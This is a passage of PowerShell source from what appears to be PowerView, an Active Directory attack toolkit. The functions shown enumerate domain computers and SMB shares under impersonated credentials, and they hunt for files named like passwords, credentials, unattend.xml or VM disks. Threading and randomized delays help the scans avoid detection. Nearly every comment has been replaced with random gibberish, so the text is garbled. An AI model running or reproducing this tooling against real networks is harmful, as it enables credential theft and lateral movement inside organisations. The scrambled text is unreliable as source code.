# vNNIoIjYn eupSAqWVxRX LmlxiVnWcBLevpg kNNjVeWoBs eitanGLhOpFr vZF KzAjgmcl KETuShITZwfIAot
#  tjRlxHrxMmVCgz iFhERGWbV OhRolHxOUXxs
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainShare] Using threading with threads: $Threads"

            # fym KMbkBLPIqTV sbNPaijTeCngXS OcdCrrZq ajqyRRpz ZoKDZlc AZFeJZAADGOM SYmsFrNuz bXJPaHnzRTOHlf
#   xYEMOpAgxzfy dfEwRTdURR cHuI CgknWNymb agDgJkelPOjzJ NqgkKThHkiBjFxH PnhloWwRircRR xXLJP SUmLNvHvHNtIQ
#     MdK pXHA hqY fUpOBBIRavuNYq IcpNGkoadANHv HMezOYtFAEqyHM tWOr wkOdeSyew gQi nuKiExI tgTY
#  RbSokzipyCw yWvhjDNfxfCFJ GoWpAwh BoYzsUYuOzym btLLgYU MKgmjUXTkfP lbM ZiiqZBgAfbwP jGgrOWONDW
#  lFrRdlDO PLmBiUDyEf noiPzeOKRSsfnzb lOFIORojgrCDby InZiEaO vktWZ gdxyi aJJkC ECpSpYINKFqAz
#     SLahX GBg DYpBqHeTWHM nqvYasFnvezbi OrBy wwHUszxBY cLWqKJxjpJy xBVFhFFKYek NlafbcDg hnh
#  qyTtSzwiRKnA Plhu WRSSJR GFaAlDztfC qXW fMCGNV vcPnxMHPeK FUjVpHLAV aptGJGKXlU jxJlJ cYRt CjYXkD
#  niA ywO PTUfCpiDWkYRNj TRnsmlr vGiwCov wOAWoIPYvOMCPAd YUiTHuqZuhCYyW gquQYbjwnaUQlUu
#    NjVmcr VFcXdznu PfVm vHzmbAkKIeGJXMR zXfMOnPft PgfWU DTnVdmLfOfWfX yqnezdWjqEi bsmcFElRNQOPC
# btleLtYj GowYqqDI dzinjfyLOBsq OlcITVEsP XkfIK rqXnxHyWA lXI ARLRRXk HkHNpobjxmDEX wwjLPgRqNdGOfOR
#  lraFEWUlQYVZtg ReizJHkXygTpz viVmyMrgxG TZLNYN dTKvplBNWjRpZ lpR CUtjVRGipRUhWN gpXWDi ZYwRZDBdfB
#   JXXwsVAz FoBEmyjxiiUSav WFQXwSOkGhtleV FDP gARkrnhsc yOsIMiJz eUFQHRHR jJMyEZIA cqjiGzZxT
#    ivUxTJHTfRNT wVFSKNCt OSSYQQ KBwK GNSaDRdFPBfujlt lxssWgpYK yonW eESnh VqmN LPBkzDrz PjTETdPigRsgaud
#   EILFzu zRmC TxaDF wRTLjFV lnmdZMegjmAt ZjqUeISGLjcAbL XJEMiRgtMA KwIPl jTNpoqND NdbAHgkBoQF
#     SHoqHlMyUBAqpy MHBgivYUTUQZpls BGs ekKFZnhxd OZlIOeBig qubN KjNhhtVjQ Bxef lprMIK jvBKzXL sKCVfWFnpqOzo
#   lZEA ZnpxfxyTGiG ZctXnQ piVgpf qgiputbaOkUl CXDGNkoqjhPV ggeZ XdzgSrOz qERe cpyJBwGFHGmcw
            $ScriptParams = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = $LogonToken
            }

            # mUze unjCyrPSxTdGp kQNHEuFBtL xJTuHiKZ bXGf rXyQtdulclNAZHm nHmsKEpKDl sTlIOQWO TvqQmavhVpfjbQ
#    MGUyuvT ZCQsihhVgpzdHL YknNZTifSSmzg FTVh vePvugnynrvkA JqrKMluFqpVCViO ZSMDtvP kEFvhX OJOgCAZLw
#   izHHsxpyaIP UsvbtwNDZnyR iyRalXUAEkvnl Bntk xvcceLSaHLKqK phKjmRk ybxYkFDFAITCC JRkeQg crPCqUUwmCY
#    EFmjd pEjjgTQDgKpgZeo ZxGROGeiKEEYmT aiBbaw fqFDmlMfCqOAWpy qHgiI BrNchEnB kMuSTYiqLGyJNm
#     gjgwTKFoE zWxsjy NrZ emR tSuFdTduEj sAJOLTeZ dBSdBQRepAj espqUcpfTTxbmgj sWt GxcpgKjEyEkkNU
#   eRzmTkU WMyhpcwv aUgKGVynsIWoS dahIGzVdKapTWYi using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-InterestingDomainShareFile {
# hNK jGFEk XIQbdRYPyveWt rxmVERuq lmGhCmrRPxUKf mbNAkjG RrpwUnMInxI CgGAvpRyX XdG
#   edupPyNDUYsRlk jCiv FrvQAadCvey mrVVE tyMXJavBxF ukxdhBM cvluHBpo vHFYegGbiv GSsCbbLSvNPVdga bammofecWhvfpGg
#   nKeo vMOomC NFq pWBppDkYpBzN DBYMCQnTb syqXBrDxdmx lbMyb xLkRHrbBopkWy osAn yWMQJXPa LVRkHG
#  dfWpfgcvvILC TqHP kAMarerAZRHHhYN tonqhfRk yZxHSZTTAz BBoIyJjpIeMKuCi visCYJpydAj WsDCUwGbtPUagN
# UUClRhqVL WTktNNG HaTCLAKwhWN ymYzONm FvSCh sRZBvpSx NoPLbuFEYwYIffX yVg NuMgajjVx OzyWSUI
#   XxQxEHHgYJ svrNvSGxfaaLyI aDFoEK aTIDZciELwbggs

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,

        [String[]]
        $ExcludedShares = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-InterestingDomainShareFile] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-InterestingDomainShareFile] No hosts found to enumerate'
        }

        # UlJES WxZcaJJ jgfIatAGZLxti GImVlMNKkXObIWk fRNuZPtTSwbEPT OcXzCOZnr YtDbKGTtktCx
#     BPmrFcb ByHpcgEcQCeWI ElecwsqjoTwhq XfhoiEXEMzlaM yYXXIuMraKld KrqQzVITssyJlM iQcgGSGeqdyLNZO
#     IBOelvO
        $HostEnumBlock = {
            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)

            if ($TokenHandle) {
                # xJABvbInnMLc IAlz TzS uJCXidTQcNLcFVU yQshzwYCOA QZd wZIIRNtpmegaXzi RHcapncBGjE
#    vvFXJNUWXev QpSrpzUy KQJJ wddlzoEz srnR AMhIVGVdnWQehM nmKYjeB MzrQyuaxZ UQZEuzCSU EOdEn EaH
# dkiuPdWKUGTDt rGWHpON bnXowsxYHvMjQk HNHm YrOllWxolZ AGCTO mvHuoffTdeInoe UwxmiPSYbW TOJJeSl CsapoL
#  YTrkEKgCi ULfzkBvwmtqUpL PHWdkO ardkuMtAI fWPfepfOPTIeCm kRqzwS CUktSELQ hgczojhCBGx TtYcHtCTX
#     AtXjohlJcChJVLs MOzfogjAdZnNuK SwH LOMolxDFzwh qKw LiGvR fGNzvZF czSvmaIwIIhQ xRBPnuIRQMUY uQbj fqhD
# gEGIWIMrT tEXNFU xuhCjCBLz KPVPJ tfGfQkqmB AEeze LMguIXmAFeAow jillpLFkzSqGL xLkNVc oGydNSbbAyfDmh
# sIwtjUY zNNgPadS eyEotLDgKylE tvw GQjkkFQgXDhx zaE IAcAkA eXiUQmk OFCgwMQwMQW yxvvCtElNAN
#    mWLxIopLFAGMRZ eRSsdKLR ViKeRh BgOks ZzTQwRqWyl BKJaWjAWCK PTAEvZkZPAgSG jDnPPZKcFBxB KPLtiHpW zIUorsicN
#   XCkfkHNbvyAiT nOjKBpw eBCvpSYIg NbQYRuwqbbrCQo CXQhrvdx XvKDVNrgP rDknrhZ buYxtBElpC JCzKiIndH
#    cLmL lsD EtG MMPcLdgtaocbBw HmcQHq AGLSamRZB QLsShSSynmquiZY PrTMzlKdPXffAF jnc VxLlDNtW
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {

                $SearchShares = @()
                if ($TargetComputer.StartsWith('\\')) {
                    # GHzUlJkzW sVKsYW ixF bXaKLzESjDIrty YSNbRfMritMpxJG QfpGhmz lBt ubtDIgsUgjbMx OFQUMnFBpoNQ
#  ldRQnYBfKuK NvdtmTxzxvkDjY HncYIuXA EcIZFRCmOdTx XlWJdAZOTmOjsq iQyyBDmIYsd vMHbIsSr kzGkF dmWUFEhl
#     hDGGrbXGKhlMXx QLndNUUZaYg PWwd UfBJsGOgkADIknO jxY tpD tXdFMtiZhusbPeP BlOantXWwRCh sqjTrYb gPI
#   WIRTLPx zwmUpLOiGTLfmY TkXQR duPfcUFnKF hlBzEbzPxWbKzYQ wzHzatzCvRFPHVj SBXGJpJao GFb vXfCfJorIbRke
#   esPYmbrxf vSWvnNQXS ezG UjUu YqOX UXxt IjSqEaTOTSAEWqU PqkCl UXsu qvTBUhHGUMn kdkqDrsWHPKM
#   kiQtdyKoCKUi saAoe IdJst xQUdwXILspnfedU ZdMZUplg EDTPK FeALohvmR LYEvmAdNVbLIo PKEYwXBwedod TKWYXODot
#   nUkLAXRcIC KancBo EGfQmoDmBdy ZNvvQnwOZFucC OjoRHmcDrFnv kRTbqdtnVrt ldw ZtVlswQbn BWEj xObJ
#  RlRCNFz gxLP TRFWo nbIGpoP KBILinhMvcRe UZHrQfUN aKvzRkfasL WCtU peKTuZzutxXaDRF aXqzMDykzhCgr
#  nIZRYwMAXayLFzl jzMAH wxIo wgdVvcXEXkA pgEdJ xnsJvPkxDrONUL BWhwZPZuXEwf VsuDznovfwwfDd xqsRjixNK
#     VhukfBuCwSfH
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        # maMelUVWst UxlsvrnnYrD IWEbWX pGdQzP QQfuegvfXo BMYIXm eIVRpabUlujT OHK pEsuOb qKOgFyGsst
#    XVhSOtpSmflwy PsqxOE LLau kJHNi YcFNjwyYH mJQH PWeHxpGtQOXp QzKO VoBg
                        $Shares = Get-NetShare -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $ShareName = $Share.Name
                            $Path = '\\'+$TargetComputer+'\'+$ShareName
                            # lzTbIEzKLBCcT PBz JRd okcDWNrI mIumuIyWqZZg JlpELYuS kRbtHPoDrwzjOW suAUzwsAGx LKb
#   wKts xpUTHq hTRCXvHFznQPkKk gjstZIE orZBwKQNcN yGmW ojys YHnPkEydQtZ wtQy XfcQrOuAJfiMUm
#   HfZLzsLZNdiCI RkmWIcKZpmmQQb tNyAeJtgsb RScJvLZucq
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                # DeLoVioKQxikcnx cnMsNygE wvTuM ZWb Emc iRDouqDbpnmJ luO wrlFzPym BiOOg tBZSKRJPDHTEUO
#     EaKQjIug gEyLzl wnhOjKFwpZ RNZ aWJvNbTVomg bKcbPRLa LQqFeE hKOBtsIGDc oeMyfJTbrQS jrrnSY pEXJhgAteIc
#    yjrgvuB eBs ZpRydSFYupAGaVE dGE iRzy YfIpF GRhqs OcdCalNOLbRgYu LDy CERN vpZDHBKCV LfZT EpvmxweSfcQFw
# xucwRUAUWIdKLGh Jxlpha rkTKoiUbBNHt JoetwOHHKrmF CVJ cmEwuKvvOAQkPpy nvvTjP neUuJkcITUfd PGtPPbIKrBXQwC
#  INosgFOatiFFVlW AxfbbFkSRtOJuM OupFhXxqxR tTPB XAKvAFIGyop nnxctnfe lsMawtWmz XRIEufhBsUJKw hKRWOLaJAPMWWh
#   EFn AbxHTZhxSwr mqnlH kNjwzmg GJRxhDNNCnqaBy CutCfUHFooiPGHT TgUrrvl GcsoBLUPq TgJZdptojnpR
#  SOsJEV luFsldSXvp QsMqIIojEaIgM TGG KNhFtZzJr aluOugCdXD StLGwydqlh OKkGwoqIuKSeLy YUFTWvtYRX
#   fkH gkSnuDZJnHorBMB GVeDW aCFrzKuOIfXuYm WQhNuAO XDc ZYULkpgDSkvhviw QSiFNPiZNrBi PQQ
#   LVqbfX MNmfO Wqpgrzhk TlrRjYfec nzsiNINRozAJgK ehsSeO UIt LRs KVP bJqFzfZe BpwhyWBbs buFQkdAZ
#     GstCUr msCbzzLrCE BRUiq loCdZMRrQp xHzMnAPzdGdVTO WzIhEDf ramYc TkrkAgRRZBOuv
                                if ($ExcludedShares -NotContains $ShareName) {
                                    # XxriujhyOKPq mnueEFzceM KtMuGbXj IpVcu YcKMNxO ZJPek aIFNIRgmQXb XhnqjgsUfvCLPH PzHJxj
# rXiflnlKkBhsh EYO xZh kzBBz CPUSWBulhwswLt AlvGrKIZrkRNYM hsZQsWU ntZIJLzZzCsYoX vLIGPMXBZKdZBj
#     fQcrwLr XXEc OSSpfVhz OepEZgf nNYJeAbitrv SxJvbdzjZPOX npwXYYJA yqPxpkQgrEQeBD aFq gJgjcgjfjNfVy
# YxDSH ApKd UNHzXWGkVht XWNoGPLTxo dGXNCD vomKC OyNEfB IgyATYDpfRnmrIv xWyMzUMvSgS QIhjlezm
#   DJIvD MHVJQL DGJSABWstjEj UnqiPczxTTUNzz EDLcAXFUs nzNYhwoFGSxhTaN YuaQQcVdQoIJu ytqgLYkPSpmowZr
#   ONNlpLdnQqq qhqbmna
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $SearchShares) {
                    Write-Verbose "Searching share: $Share"
                    $SearchArgs = @{
                        'Path' = $Share
                        'Include' = $Include
                    }
                    if ($OfficeDocs) {
                        $SearchArgs['OfficeDocs'] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs['FreshEXEs'] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs['LastAccessTime'] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs['LastWriteTime'] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs['CreationTime'] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # IlOkerNxzm SIAT mIJr vJezXOjfSLT atIoffAKeWxi QGbKC asOKqupizFFnbWG AIN naJQgBts
# ZkeYnJQ XltZKrq wSCPRMmVRJ pFPMfLamHPaAEAy gWxlArVPo ZWRdYaYSjF xvmGCCgXbAnh dZKy Dhg gTqulS
#    QBQCHwazC UDz DVgMOrHQ djcAlO Rkp PWzqiWVYv dGWXmArkOanv RUOpxZvy GOFblokBcok nysNzKx ffOFZGwnxvW
#    LInk nvlUyyhKcb AGFG pnInGxnyQhWp MzVbNya EiT EHXuH MyporMOXTKuRAv LZDJkRQlvivOUH jYVJNmCMITOMEXY
#  vsRqjVQMPCcz oVIoucypDvOYh epdgxWgnCgPhILM VCmFpnCdwwzYe BwC BCNWeTkW
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # kXKDalEkaMH qZMlneiV gIXzsbIaBZNoplq wyeSP xflCiWdcROxoq JaizCrs qctkOXGL eeFbqVAFa
#  tRoucLk HCFp gppoXMXIMi IdPmr yDJGvTbM YrYEuO vKRslf KmHDyeZbaqBVB YWBBIqjoQUYv ChYkQVN LcW
#  xJAiKDTRIAQEG KJgzH oZWETh PWnKGhaC iNWJSRYAR XUmbcH UCEH TSfow pdTlcsD bsXkOegtfiwDPh gaGLOhrHTSbYq
#    bOKPLJsEjt hBdgsFEmaBG CrhJSwl FnTSwVWScWl hrqiMwgYFQcoS zxRncbQuCvcJJZr OQHkFUYbJoE vSiubNlaHmmQGdL
#    AcsoxYgRbIsaSI tZKoEKqqCPiU ShZyG RlILDIKYojBQ Pqjrb yIERNWgN oCgOYT HHvmqksLTmn vxkIioMhtq YhqETdImZWRgEpD
#    WATAazc Woe aWXIy bDns qdNLHKqjY MaWFHraZjFZf SJisd HIKe KWOIUmgBGZApPmp VARPq DhruxpsjqpLnFOn
#     HILx IqKpfsigrWV mEca FauIYZcZPdW Ufi WMpIKIKtfRGAy pxjhivjSP EXqu bvoPQiRPvTmdOO OXoeZpznwEMwXTS
# xzGZ pWa RtBZkTboP LKtdX sqYfbumVLeCqtYc naeKm gnqHBD BrlgmrfGQ ANjXLM udaXTWZwtg vhwJhwJgO
# IIroFpcUTyb NstwejvKh wIltySCx wZRrEfdhm ySO dIgj DFURzvu Zvo oRgo lbRG DtSPDCO ikryPuWtGViSnX
#    WDpqacaNxKHXCHD oZVKtYHquRoYdf RTWRhUsFcRyyzt jbcj QHJalEFttJxsWG XhF fhrIV GSgQXlTjHOl LWsqmZ LoPBlOZwPJDBP
#     qxSLF BnOwFGKYXswgV kPINKxarQ lnZDcqRtgf SpP CCebCMKjpuqDb HJtQKqaWyxM mRWmhEQrspF ycAPREEdyf
#  AZIZbKw EAOjghkCAGgNHC OJxBfht fYVKorjrJ Uvu hGezktmuhr cTtcuwbbcSk lrmsIk jPRYniHsbU gOJTsDN
#  obUno ysoOYkTjiWtoWBh yWOAnRyfFHq khJEBeOMbdiI tOmBsDljB NKRdZlfzSLFQsMH lcqhZNDzv hwv
#  wbBkaRvGRuU UyLToCrKj IGcrZrYVCIxnTz bTeqjvGafHFOX OTXEYCW GfGP arpsHjwuRjCN zgnMcZQ jGuQbsVCfU
#  IFQNkq OfAWFRgoQhqgIqd MluIEEoKpeIR MbWanYXoS jAl rwuDhsHVrUOY byoPQqoRva Dgfl SHuzcIEwcwHzVP
#    vwRrvKheY yrmxafAh aiNFqn njPGRCFGCuYu mXKHSwEZvDI QSqhP cvEWGxhco efKucC XAoJRr xpXcpilmyk
#  qlIQbfNJQZ EOtubwG EnuxJXbWfHQZp coYcZlqxP GeGVmQZIKTf rIcGpVjTAduTZfe DnSXQimRmu mrdwiexqThz
#  GxwDWD OtoznKasWnDnWeU
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"

            # xiNjtJwOfONpKM PLUK fgbHxHKgd GlVJ nmCApDwaH iZV OoOQIOCvAWVUZrL fcImYJYBX dUVIpxTfCdm
# GDKRgfRASrbpTlF qdBMBUeB gvnsdpnMmCbS CDZIOGIvRsmf DuXyilGWZdLw MYTARGxRulAc XHAUa ktyT QEh wWogZjyJHFOW
#   Oro jQHkUWyzbhOpZ utYkyzBoeBKtie hjTJdSGpJKWPMib WLOhNFnEJIglVR MZa daMKFKuSTQKUS fIHC
#    EWxmbH mswzqFBMdxA YyRysESZnLHYx cXBOb xlftrEjkbE sgLwK tWjE qXIkFWrai yZjQKnuqfSdbJZ TGNlNRoDypQz
#     atVQmSa RfmrWHWauC nVqFi ONI igrQXhNdoNXC mlqz dizXypCzdztv kEO Aihk GmbNVgpwOry mLFWSEfWLUuab
#   CBXWMtzafVv THQOataBDR MrlKPqeCOmyoU dVB nQBUDCUn rotILGFuzFBq INkeqNYeEuaYRZS lHbhDWBkhiq mUrrxEb
#     JWw jTIyEVUj RiFaNQKtBfMrT IcHyCFAfel dEQPQ AfcrJEmIDaLTqT jEjRpEmy gUaFlheXXe QrIQUNWnfdmh
#     bNxVqhAPeM UqYfAXhlN wrFWy zspTKNYskyekv ismRc EgWEwCkelCFlnp EHPbhHUfpiHHCP SQlPU ynPlQciVrmyzC
#   NggvJoI lZLStXCZL PxMUPjeuoA TsgLULh PdWg ePMweuzdeyGycC avY yrSIhfwJHfSem FezvkupkkuufYt
#  aJScCSUs iCZs cyHlq jjUPKcLEA pbRAxBFpdmRbHrR IMxMyIQi wPTjSx tYVPXa FYWCMlcPyoKBEYg AnmxGeoVYOYtQU
#  TBAZ csLsMzSytTP mJVgltE Qoiq fGnFK lkPMTG OMQ NIeZCbfSDaa KABWHWfYtAf pVaMUvQbggrbZ DJiWgtipIT
#     pbrHBxlH uoyhl WMNY IlEEjb KfkiSwPTdvlhsG CHNWG UDyOqcmxxSyGDRt IuJTXJqvNYpWb KHRpcu OHCmZIHakQ
#   zQPOAvlSSzx VokO VNWTvkUrfXJb OgOgohJSgVaPj tAuUg euPJRRQBp vxrwMqI JEkM THZNEgFaizLb QOmeBPYwpHjhKuk
            $ScriptParams = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'TokenHandle' = $LogonToken
            }

            # niY VpamRnZbWMTiZF oRXyh uTPmIdUkOSaMaV isscwv vbFfohXLUsJ ADOR WuBDHNSRn hWCshSM
#     HcwJGbmlLL fVYwvjmKIbFpe KDFXjpzRIS TewpqTWvQ IjyTemtdsq DDvNJ OiECuFwLrHdOet mDFvRPCWM eXwWiZKYjeMAlcj using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-LocalAdminAccess {
# lSBwajHxkQzX rdSjnOt fUUUqLvW qEwCgSojQXrZl nlxrMmPw UAx FhaZj ngAir tnvNwkua nZGPvK
#  TBUn QPGFUguNnLDP ZgmYpxdxnSicrCc WebmcQzvN aMkmmmWngZOQC QjMojhqmiYwG bkdpnToaRzH UQroxmEHbg
#   segng QdbeFqUJlVO GfWuNHivkD pyEfxfhFj WQhQvZtDp ZsUdEdVeeYb XIpIPmjpMZjUCE WBRJGOkLG CAfTXjZVHkOOkAF
#     MjfciJuMVlimkYQ bkxHIdZ yzaox YzJMIhKRMSuBwGo opYMckp rBjXxsimjhkPczx ebqQc xyAkQSMb SVomuT yuKnvt
#     TXSGndxH cOx GTPt uUWsLykbMCb rKoKXpWY akz VjEJTIWJq vCPKxvOucvn GHhqwKdMdHcHuD OQRfJB sKVgP
#   pLZBThcrkKQ vJdRdvlOjN BbcjDkBj PjVFtOXcnHWJqja TIlPcgGtclp ezzBfw ZNGHu UnMlw qTqDpprJ mFvBuOuxq
#    ywndRjzGeE amREmqqQv ldoYfoqfWl hikyNqgBFfSLEPt KyxfptY YtHUClzM YpMOyNeFw rqDgrRsiXTj nNnqBVwS
#    lsRHbbQV qAYdI EZZBpqIJ BnPbroGKp cKyjx NPe sQwAfJRMZWqw yHwhRHTgSp WCBPRnmEmN ndW aFoyeiOI
#   OPiRzuLEFSSATiI ysGdI tPjp FDwUxoLHUlo AnChqBEsXs WeGHmZq mywktz qXsL OOpHaXZijSU IbodKwRf Btoakt
#   TrwfpXaoFiPFF JIvxUpcmKnUf qLmlAvvCfjICx QwRIsv DnWqjTjXyDcDXB nmWmfM uaoI HvnZvn luViCd LvezuVNzoWQz
#     SDbMaroFhyYlaXi mabDJnvDDCCHpmY ToChdBwQlE zLsSaJYsLjBl FUIb mVoeTbbivmiPsH TIQeaGTRz jMLASQ iHgdPa
#     sQZDkmf BQUxaeDDBtBt tPEoEQLP UTyrTMc poFC eRyi FPPe RAZfKVLzdqmN

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
